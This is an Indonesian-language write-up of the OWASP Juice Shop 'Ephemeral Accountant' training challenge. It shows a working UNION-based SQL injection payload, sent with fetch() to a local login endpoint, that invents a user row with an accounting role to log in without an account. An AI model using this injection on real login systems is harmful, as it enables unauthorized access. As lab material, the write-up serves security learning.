## Penyelesaian Tantangan: Ephemeral Accountant

### Deskripsi Tantangan
Tantangan ini menuntut saya untuk masuk sebagai pengguna yang tidak ada (`acc0unt4nt@juice-sh.op`) tanpa mendaftarkannya terlebih dahulu. Pengguna ini harus "diciptakan" secara sementara hanya selama proses login.

### Strategi dan Eksekusi Serangan

#### Analisis Fungsionalitas
Saya mengidentifikasi adanya endpoint `POST /rest/user/login` sebagai target utama.

#### Eksekusi Serangan
dengan `control + shift + i` agar dapat masuk ke console inspect.

Kode yang berhasil:

```javascript
fetch('http://127.0.0.1:3000/rest/user/login', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
        "email": "' UNION SELECT * FROM (SELECT 20 AS `id`, 'acc0unt4nt@juice-sh.op' AS `username`, 'acc0unt4nt@juice-sh.op' AS `email`, 'test1234' AS `password`, 'accounting' AS `role`, '123' AS `deluxeToken`, '1.2.3.4' AS `lastLoginIp`, '/assets/public/images/uploads/default.svg' AS `profileImage`, '' AS `totpSecret`, 1 AS `isActive`, 12983283 AS `createdAt`, 133424 AS `updatedAt`, NULL AS `deletedAt`) AS tmp WHERE '1'='1';--",
        "password": "test1234"
    })
});
```

### Analisis Hasil
Serangan SQL Injection ini berhasil

### Bukti 
<img width="1920" height="1080" alt="Screenshot (588)" src="https://github.com/user-attachments/assets/71278b75-f2d9-4476-9daf-763abd0ba2fa" />
